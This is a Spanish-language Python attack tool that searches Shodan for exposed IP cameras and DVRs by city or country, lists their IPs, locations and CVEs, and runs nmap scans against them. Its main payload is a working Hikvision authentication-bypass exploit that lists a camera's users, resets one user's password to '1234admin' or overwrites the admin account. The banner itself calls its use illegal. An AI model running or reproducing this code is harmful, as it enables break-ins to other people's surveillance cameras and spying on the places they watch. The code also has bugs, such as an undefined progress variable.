#!/usr/bin/python3

try:

    import argparse
    import sys,os,time
    import subprocess
    import signal
    from datetime import datetime
    from threading import Thread
    import random
    import os
    import requests
    from requests.exceptions import ConnectTimeout
    import webbrowser
    import signal
    from pwn import *
    import subprocess
    import nmap
    import json
    import imgkit
    from PIL import Image
    from tabulate import tabulate
    from shodan import Shodan
    import requests
    from pyfiglet import Figlet
    import tailer

except ImportError as e:
    print("Error: %s \n" % (e))
    print("Try this ... pip install -r /path/to/requirements.txt")

os.system("")

class backgroundColor:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Declaracion de variables globales

# Para el almacenamiento de las ips procesadas
ips_listadas = []


# Salida programa
def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, def_handler)
 

# Búsqueda de principales querys
list_querys = ['title:camera',
                'webcam has_screenshot:true',
                'has_screenshot:true IP Webcam',                    
                'server:webcampxp',                                 
                'server:webcam 7',                                  
                '"Server:IP Webcam Server" "200 OK"',                
                'title:blue iris remote view',                    
                "title:'ui3 -'",                                       
                'title:Network Camera VB-M600',                      
                'product:Yawcam webcam viewer httpd',                
                '"Server:yawcam" "Mime-Type: text/html"',             
                'title:IPCam Client',                               
                'server:GeoHttpServer',                                
                'server:VVTK-HTTP-Server',                            
                'title:Avigilon',                                    
                'ACTi',                                                
                'WWW-Authenticate:Merit LILIN Ent. Co., Ltd.',      
                'title:+tm01+',                                      
                'server:i-Catcher Console',                         
                'Netwave IP Camera Content-Length: 2574',              
                '200 ok dvr port:81',                                
                'WVC80N',                                              
                'html:DVR_H264 ActiveX',                             
                'linux upnp avtech',                                   
                '/cgi-bin/guestimage.html',                            
                'product:Hikvision IP Camera',                       
                'Server:uc-httpd 1.0.0 NETSurveillance uc-httpd'
                'webcam has_screenshot:true'
                'http.title:"WEB VIEW"'
                'http.title:"Webcam"'
             ]     


def main() :

    Graph = Figlet(font='slant')
    GraphRender = Graph.renderText('Cameras finder')

    print("%s" % (backgroundColor.WARNING + GraphRender + backgroundColor.ENDC))
    print(backgroundColor.FAIL + "\rThis tool is successfully connected to shodan service\nInformation the use of this tool is illegal, not bad.\n" + backgroundColor.ENDC)

    parser = argparse.ArgumentParser()
    parser.add_argument('-a', action="store_true", help='Búsqueda del listado interno de cámaras')
    parser.add_argument('-f', dest='busqueda', type=str, help='Búsqueda de una cámara en concreto')
    parser.add_argument('-k', dest="api_key", default='', type=str, help='Shodan API key')
    parser.add_argument('-c', dest="city", default='', type=str, help='Ciudad donde se quiere realizar la búsqueda')
    parser.add_argument('-o', dest="country", default='', type=str, help='Pais donde se quiere realizar la búsqueda')
    parser.add_argument('-l', dest="limit", type=str, default='5', help='Limitar el número de respuestas de Shodan')
    parser.add_argument('-t', dest="output", default='', type=str, help='Output log File')

    args = parser.parse_args()

    # Generamos el fichero de output
    if args.output != "":
        global filename
        filename = args.output

        #Borramos el contenido que había en el archivo anteriormente
        with open(filename, 'w') as f:            
            pass

    try:
        if sys.argv[2] == "-h" or sys.argv[2] == "--help":
            print("Usage: python camerasfinder.py --help")
            sys.exit(0)

    except Exception as e:
        print("Usage: python camerasfinder.py --help")
        sys.exit(0)

    runner(args)



def runner(args):

    api = Shodan(args.api_key)

    aux_busqueda = ""

    if args.city!='':

        aux_busqueda = " city:" + '"' + args.city + '" '

    if args.country!='':

        aux_busqueda = aux_busqueda + " country:" + '"' + args.country + '"'

    if args.a:

        allquerys(args,api,aux_busqueda)

    if args.busqueda:

        specificquery(args,api,aux_busqueda)




def allquerys(args,api,aux_busqueda):

    for x in list_querys:

        aux_busqueda_local = x + aux_busqueda

        # Barra de estado
        print()
        p1 = log.progress(backgroundColor.OKGREEN + backgroundColor.BOLD + "Realizando búsqueda " + backgroundColor.ENDC + backgroundColor.OKBLUE + "'%s'" % (aux_busqueda_local) + backgroundColor.ENDC)

        # Búsqueda API
        result = api.search(aux_busqueda_local)

        # Fin barra estado
        p1.success('Hecho!')

        try:
            print(backgroundColor.FAIL + "Resultados encontrados: {}" .format(result['total']) + backgroundColor.ENDC)
            print()

            total = result['matches']

            if len(total) != 0:

                del total[int(args.limit):]

            printresults(total,api,args,aux_busqueda_local)

        except Exception as e:
                print(e)
                print('An error occured')




def specificquery(args,api,aux_busqueda): 

    aux_busqueda = args.busqueda + aux_busqueda

    # Barra de estado
    print()
    p1 = log.progress(backgroundColor.OKGREEN + backgroundColor.BOLD + "Realizando búsqueda " + backgroundColor.ENDC + backgroundColor.OKBLUE + "'%s'" % (aux_busqueda) + backgroundColor.ENDC)

    # Búsqueda API
    result = api.search(aux_busqueda)

    # Fin barra estado
    p1.success('Hecho!')

    try:
        print(backgroundColor.FAIL + "Resultados encontrados: {}" .format(result['total']) + backgroundColor.ENDC)
        print()

        total = result['matches']

        if len(total) != 0:

            del total[int(args.limit):]

        printresults(total,api,args,aux_busqueda)

    except Exception as e:
            print(e)
            print('An error occured')




def printresults(total,api,args,aux_busqueda):

    aux = False
    count = 1

    if args.output!="":
        log_output(busqueda=aux_busqueda)

    ports_totales = []

    try:
        # Loop through the matches and print each IP
        for service in total:

            print(backgroundColor.OKGREEN + backgroundColor.BOLD + "Resultado: (%i)" %(count) + backgroundColor.ENDC)
            
            ip = service['ip_str']

            # Almacenar ip listadas
            ips_listadas.append(ip)

            marca_modelo = service['os']
            organizacion = service['org']
            
            
            if 'product' in service:
                product = service['product']
                
            else:
                product = "No encontrado"
           

            host = api.host(service['ip_str'])
            
            ports = []

            for item in host['data']:
                
                if aux == False :
                    ubicacion = item['location']['city'] + "-" + item['location']['country_name']
                    
                    aux = True
                ports.append(item['port'])

            ports_totales.append(ports) 
            ports = ', '.join(map(str, ports))


            count = count + 1

            aux = False

            print(backgroundColor.BOLD + "IP:"+ backgroundColor.ENDC,ip)
            print(backgroundColor.BOLD + "Marca y modelo o software del dispositivo:" + backgroundColor.ENDC,marca_modelo)
            print(backgroundColor.BOLD + "Organización a la que pertenece:" + backgroundColor.ENDC,organizacion)
            print(backgroundColor.BOLD + "Producto:" + backgroundColor.ENDC,product)
            print(backgroundColor.BOLD + "Ubicacion: " + backgroundColor.ENDC + " %s" % (ubicacion))
            print(backgroundColor.BOLD + "Puertos:" + backgroundColor.ENDC, ports) 

            vulns = []

            if 'vulns' in host:
                #print(host['data'])
                for item in host['vulns']:
                
                    CVE = item.replace('!','')
                    vulns.append(item)
                    print(backgroundColor.BOLD + 'Vulns: ' + backgroundColor.ENDC +  '%s' % item)

            else:
                print(backgroundColor.BOLD + "Vulnerabilidades: " + backgroundColor.ENDC + "No encontradas")

            print(backgroundColor.BOLD + "---------------------------------" + backgroundColor.ENDC)

            if args.output!="":
            
                log_output(ip=ip,marca_modelo=marca_modelo,organizacion=organizacion,product=product,ubicacion=ubicacion,ports=ports,vulns=vulns,args=args)

        print(backgroundColor.OKGREEN + backgroundColor.BOLD + "\nEscaner finalizado. " + backgroundColor.ENDC)

        if args.busqueda:
            # Preguntar al usuario si quiere cerrar ya la aplicación o llevar a cabo un reconocimiento o explotación (solo disponible para busqueda simple)
            preguntar_usuario(ips_listadas,ports_totales)

    except Exception as e:
                print(e)
                print('An error occured')



def log_output(ip=None,marca_modelo=None,organizacion=None,product=None,ubicacion=None,ports=None,vulns=None,existe_imagen=None,busqueda=None,args=None):

    if busqueda!=None:
        out = "\n[+] Búsqueda realizada para... %s" % (busqueda)

        with open(filename, 'a') as f:
            print(out, file=f)  # Python 3.x
            print("---------------------------------\n", file=f)
            print("\n")

    else: 
    
        out = "\t[-] Host: %s\n\t[-] Marca o modelo: %s\n\t[-] Organizacion: %s\n\t[-] Producto: %s\n\t[-] Ubicacion: %s\n\t[-] Puertos: %s\n\t[-] Vulns: %s\n " % (ip, marca_modelo, organizacion, product, ubicacion, ports, vulns)
                

        #out = "[+] Host: %s -- [+] Marca o modelo: %s -- [+] Organizacion: %s -- [+] Producto: %s -- [+] Ubicacion: %s -- [+] Puertos: %s -- [+] Vulns: %s\n " % (ip, marca_modelo, organizacion, product, ubicacion, ports, vulns)
        with open(filename, 'a') as f:
            print(out, file=f)  # Python 3.x
            print("\t-----------------------", file=f)
            print("\n")



def preguntar_usuario(ips_listadas,ports_totales):

    print(backgroundColor.BOLD + "\n\nSeleccione una de las siguientes opciones:"+  backgroundColor.ENDC)

    # Imprimir el menú
    menu = '\n1. Realizar un escaneo nmap sobre una IP. \n2. Comprobar recursos web de una ip.\n3. Exploit cámaras Hikvision.\n4. Salir del programa. \n'
    print(menu)

    # Esperar a que el usuario proporcione una entrada de texto
    entrada = input(backgroundColor.OKGREEN + backgroundColor.BOLD + '> ' + backgroundColor.ENDC)

    # Realizar acciones en función de la entrada del usuario
    if entrada == "1" or int(entrada) == 1:

        print(backgroundColor.BOLD + "\nListado de IPs encontradas:\n" + backgroundColor.ENDC)

        # Imprimimos las ip scaneadas

        for i, valor in enumerate(ips_listadas):
            i_real = i+1
            print(backgroundColor.OKGREEN + backgroundColor.BOLD + "[" + str(i_real) + "]" + backgroundColor.ENDC,"-",valor)

        # Esperar a que el usuario proporcione una entrada de texto
        entrada = input('\nIngrese el número del valor de la ip a analizar ' + backgroundColor.OKGREEN + backgroundColor.BOLD + '> ' + backgroundColor.ENDC)

        # Convertir la entrada del usuario en un número entero
        indice = int(entrada) - 1

        # Realizar acciones en función del valor seleccionado
        if indice < 0 or indice >= len(ips_listadas):
            print('El índice seleccionado no es válido')

        else:
            valor_seleccionado = ips_listadas[indice]

            launchnmap(valor_seleccionado)

        preguntar_usuario(ips_listadas,ports_totales)

    elif entrada == '2' or int(entrada) == 2:

        print(backgroundColor.BOLD + "\nListado de IPs encontradas:\n" + backgroundColor.ENDC)

        # Imprimimos las ip scaneadas

        for i, valor in enumerate(ips_listadas):
            i_real = i+1
            print(backgroundColor.OKGREEN + backgroundColor.BOLD + "[" + str(i_real) + "]" + backgroundColor.ENDC,"-",valor)

        # Esperar a que el usuario proporcione una entrada de texto
        entrada_ip = input('\nIngrese el número del valor de la ip a analizar ' + backgroundColor.OKGREEN + backgroundColor.BOLD + '> ' + backgroundColor.ENDC)

        # Convertir la entrada del usuario en un número entero
        indice = int(entrada_ip) - 1

        # Realizar acciones en función del valor seleccionado
        if indice < 0 or indice >= len(ips_listadas):
            print('El índice seleccionado no es válido')

        else:
            valor_seleccionado = ips_listadas[indice]
            print(valor_seleccionado)

            ports_valor_seleccionado = ports_totales[indice]

            ports = ', '.join(map(str, ports_valor_seleccionado))
            existe_imagen = None
            
            requestAndDownload(valor_seleccionado,ports)
            #results_request = '\n'.join(existe_imagen)

            #print(results_request)

        preguntar_usuario(ips_listadas,ports_totales)

    elif entrada == '3' or int(entrada) == 3:


        print("\n")
        p1 = log.progress(backgroundColor.BOLD + "Realizando comprobación de cámaras vulnerables" + backgroundColor.ENDC)
        #p1.status("Realizando proceso de búqueda")

        ips_vulnerables = hikvision_exploit_check(ips_listadas,ports_totales)

        p1.success('Hecho!')

        print(backgroundColor.BOLD + "\nListado de cámaras vulnerables:\n" + backgroundColor.ENDC)

        for i, valor in enumerate(ips_vulnerables):
            i_real = i+1
            print(backgroundColor.OKGREEN + backgroundColor.BOLD + "[" + str(i_real) + "]" + backgroundColor.ENDC,"-",valor)

        
        print(backgroundColor.BOLD + "\n\nSeleccione una de las siguientes opciones:"+  backgroundColor.ENDC)

        # Imprimir el menú
        menu = '\n1. Enumerar usuarios y cambiar contraseña. \n2. Lanzar ataque de creación de usuario administrador. \n3. Volver.\n'
        print(menu)

         # Esperar a que el usuario proporcione una entrada de texto
        entrada = input(backgroundColor.OKGREEN + backgroundColor.BOLD + '> ' + backgroundColor.ENDC)

        if entrada == "1" or int(entrada) == 1:

            # Esperar a que el usuario proporcione una entrada de texto
            entrada_ip = input('\nIngrese el número del valor de la cámara a analizar ' + backgroundColor.OKGREEN + backgroundColor.BOLD + '> ' + backgroundColor.ENDC)

            # Convertir la entrada del usuario en un número entero
            indice = int(entrada_ip) - 1

            # Realizar acciones en función del valor seleccionado
            if indice < 0 or indice >= len(ips_vulnerables):
                print('El índice seleccionado no es válido')

            else:
                valor_seleccionado = ips_vulnerables[indice]
                enumerar_usuarios_hikvision(valor_seleccionado)

            preguntar_usuario(ips_listadas,ports_totales)

        if entrada == "2" or int(entrada) == 2:
            # Esperar a que el usuario proporcione una entrada de texto
            entrada_ip = input('\nIngrese el número del valor de la cámara a analizar ' + backgroundColor.OKGREEN + backgroundColor.BOLD + '> ' + backgroundColor.ENDC)

            # Convertir la entrada del usuario en un número entero
            indice = int(entrada_ip) - 1

            # Realizar acciones en función del valor seleccionado
            if indice < 0 or indice >= len(ips_vulnerables):
                print('El índice seleccionado no es válido')

            else:
                valor_seleccionado = ips_vulnerables[indice]
                create_user_hikvision(valor_seleccionado)
                #enumerar_usuarios_hikvision(valor_seleccionado)

            preguntar_usuario(ips_listadas,ports_totales)
            

        if entrada == "3" or int(entrada) == 3:
            
            preguntar_usuario(ips_listadas,ports_totales)

    elif entrada == '4' or int(entrada) == 4:
        print(backgroundColor.OKGREEN + backgroundColor.BOLD + "\nBye....\n" + backgroundColor.ENDC)
        sys.exit(0)

    else:
        print('Opción no válida, seleccione una opción válida')

        preguntar_usuario(ips_listadas,ports_totales)



def requestAndDownload(valor_seleccionado,ports):
        
    host = str(valor_seleccionado)
    #results = []
    ports_list = ports.split(", ")

    # Animación para el proceso de búsqueda
    print("\n")

    p1 = log.progress(backgroundColor.BOLD + "Búsqueda de recursos web" + backgroundColor.ENDC)
    p1.status("Realizando proceso de búqueda")

    print("\n")

    for port in ports_list:

        url = "http://%s:%s" % (host,str(port))

        try:

            r = requests.get(url, timeout=5)

            if r.status_code == 200:

                print(backgroundColor.OKGREEN + backgroundColor.BOLD + "[Info]" + backgroundColor.ENDC + 'Pagina disponible con código 200 para la dirección http://%s:%s' % (host,str(port)))

                print(backgroundColor.BOLD + "\tGenerando imagen de la pagina web" + backgroundColor.ENDC)

                # Crear imagen del sitio web
                name= str(port) + ".png"
                options = {
                    'quiet': ''
                    }
                imgkit.from_url(url, name, options=options)
                p2.succes('Hecho!')
                img = Image.open(name)
                img.show()
            

            elif r.status_code == 302:

                print(backgroundColor.OKGREEN + backgroundColor.BOLD + "[Info] " + backgroundColor.ENDC + 'Pagina disponible con código 302 para la dirección http://%s:%s' % (host,str(port)))

            elif r.status_code == 401:

                print(backgroundColor.OKGREEN + backgroundColor.BOLD + "[Info] " + backgroundColor.ENDC + 'Pagina disponible con código 401 (Unauthorized) para la dirección http://%s:%s' % (host,str(port)))

            elif 'ConnectTimeoutError' in r.text:

                print(backgroundColor.OKGREEN + backgroundColor.BOLD + "[Info] " + backgroundColor.ENDC + 'La respuesta contiene ConnectTimeoutError para la dirección http://%s:%s' % (host,str(port)))

            else:

                print(backgroundColor.OKGREEN + backgroundColor.BOLD + "[Info] " + backgroundColor.ENDC + 'Pagina no disponible para la dirección http://%s:%s' % (host,str(port)))

        except ConnectTimeout:

            print(backgroundColor.OKGREEN + backgroundColor.BOLD + "[Info] " + backgroundColor.ENDC + 'La solicitud ha expirado para la dirección http://%s:%s' % (host,str(port)))
            
        except Exception as e: 

            print(backgroundColor.FAIL + backgroundColor.BOLD + "[Error] " + backgroundColor.ENDC + 'Error inexperado para la solicitud de la dirección http://%s:%s' % (host,str(port)))


    p1.success('Hecho!')




def launchnmap(dst_ip):

    print("\n")
    p1 = log.progress(backgroundColor.BOLD + "Realizando proceso de búsqueda Nmap" + backgroundColor.ENDC)
    p1.status(dst_ip)

    nm = nmap.PortScanner()
    nm.scan(hosts=str(dst_ip), arguments='-n -sSCV -Pn --min-rate 5000')
    
    p1.success('Hecho!')

    json_data = nm[dst_ip]


    parsed_json = json.dumps(json_data)
    parsed_json = json.loads(parsed_json)

    print(backgroundColor.OKGREEN + backgroundColor.BOLD + "\nResultados obtenidos: " + backgroundColor.ENDC + backgroundColor.BOLD + dst_ip + "\n" + backgroundColor.ENDC)

    filas = []

    for key, value in parsed_json["tcp"].items():
        if value["product"]=="":
            aux_product = "vacío"
        else:
            aux_product = value["product"]

        if value["version"]=="":
            aux_version = "vacío"
        else:
            aux_version = value["version"]

        fila = [str(key),value["state"],value["name"],aux_version,aux_product]
        filas.append(fila)

    print(tabulate(filas, headers=[backgroundColor.OKBLUE + backgroundColor.BOLD + 'Puerto' + backgroundColor.ENDC + backgroundColor.BOLD ,backgroundColor.OKBLUE + backgroundColor.BOLD + 'Estado' + backgroundColor.ENDC + backgroundColor.BOLD, backgroundColor.OKBLUE + backgroundColor.BOLD + 'Servicio' + backgroundColor.ENDC, backgroundColor.OKBLUE + backgroundColor.BOLD + 'Version' + backgroundColor.ENDC,backgroundColor.OKBLUE + backgroundColor.BOLD + 'Producto' + backgroundColor.ENDC]))



def hikvision_exploit_check(ips_listadas,ports_totales):

    aux = 1

    # Comprobamos que no se trata de honey pots:
    ips_listadas_checked,ports_totales_checked = comprobar_honeypot(ips_listadas,ports_totales)

    ips_vulnerablres = []
    i = 0
    for ip_to_check in ips_listadas_checked:
        for port in ports_totales_checked[i]:
            try:
                response = requests.get('http://'+str(ip_to_check)+':'+str(port)+'/security/users/1?auth=YWRtaW46MTEK', timeout=5)
                if response.status_code == 200:
                    #print("Vulnerable " + str(ip_to_check) + ":" + str(port))
                    ips_vulnerablres.append(str(ip_to_check)+":"+str(port))

                elif response.status_code ==401:
                    pass
                elif response.status_code ==404:
                    pass
            except Exception as e: 
                aux = 2
        i = i+1

    return ips_vulnerablres



def enumerar_usuarios_hikvision(ip_target):
    URLBase = "http://"+str(ip_target) + "/"
    lista = requests.get(URLBase + "Security/users?1?auth=YWRtaW46MTEK").text
    idf = "<id>"
    pattern_id = r'(<id>).*'
    find_id = re.findall('<id>(.*?)</id>', lista,re.DOTALL)
    find_user = re.findall('<userName>(.+?)</userName>', lista, re.DOTALL)
    counter = 0

    print("\n")

    while counter < len(find_id):

        print(backgroundColor.OKGREEN + backgroundColor.BOLD + "[" + str(counter+1) + "]" + backgroundColor.ENDC,"-"," Usuario: " + find_user[counter] + " con el id: " + find_id[counter])
        counter += 1


    select_user = input('\nIngrese el número de usuario que desea modificar su contraseña ' + backgroundColor.OKGREEN + backgroundColor.BOLD + '> ' + backgroundColor.ENDC)
    select_user = int(select_user) - 1
    userID = find_id[select_user]
    userName = find_user[select_user]

    userXML = '<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">''.<id>'+ userID + '</id>.<userName>'+ userName + '</userName>.<password>' + "1234admin" +'</password>.</User>'
    URLUpload = URLBase + "Security/users/1?1?auth=YWRtaW46MTEK"
    a = requests.put(URLUpload, data=userXML)

    if a.status_code == 200:
        print("\n")
        print(backgroundColor.OKGREEN + backgroundColor.BOLD + "[Success] " + backgroundColor.ENDC + 'Se ha modificado al usuario %s y cambiado su contraseña a 1234admin\n' % (userName) +  "en el host http://" + ip_target)
    elif a.status_code != 200:
        print("\n")
        print(backgroundColor.FAIL + backgroundColor.BOLD + "[Error] " + backgroundColor.ENDC + 'Error inexperado en la solicitud')


def create_user_hikvision(ip_target):

    newPass = "1234admin"
    userID = "1"
    userName = "admin"
    userXML = '<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">''.<id>'+ userID + '</id>.<userName>'+ userName + '</userName>.<password>'+ newPass + '</password>.</User>'
    URLBase = "http://"+str(ip_target) + "/"
    URLUpload = URLBase + "Security/users?1?auth=YWRtaW46MTEK"
    a = requests.put(URLUpload, data=userXML)

    if a.status_code == 200:
        print("\n")
        print(backgroundColor.OKGREEN + backgroundColor.BOLD + "[Success] " + backgroundColor.ENDC + 'Se ha creado al usuario %s con contraseña a 1234admin\n' % (userName) +  "en el host http://" + ip_target)
    elif a.status_code != 200:
        print("\n")
        print(backgroundColor.FAIL + backgroundColor.BOLD + "[Error] " + backgroundColor.ENDC + 'Error inexperado en la solicitud')
    


def comprobar_honeypot(ips_listadas,ports_totales):

    ips_listadas_checked = []
    ports_totales_checked = []

    i = 0
    for ip_to_check in ips_listadas:
        if len(ports_totales[i]) <= 6:
            ips_listadas_checked.append(ip_to_check)
            ports_totales_checked.append(ports_totales[i])
        i = i + 1

    return ips_listadas_checked,ports_totales_checked


if __name__ == "__main__" :
 main()
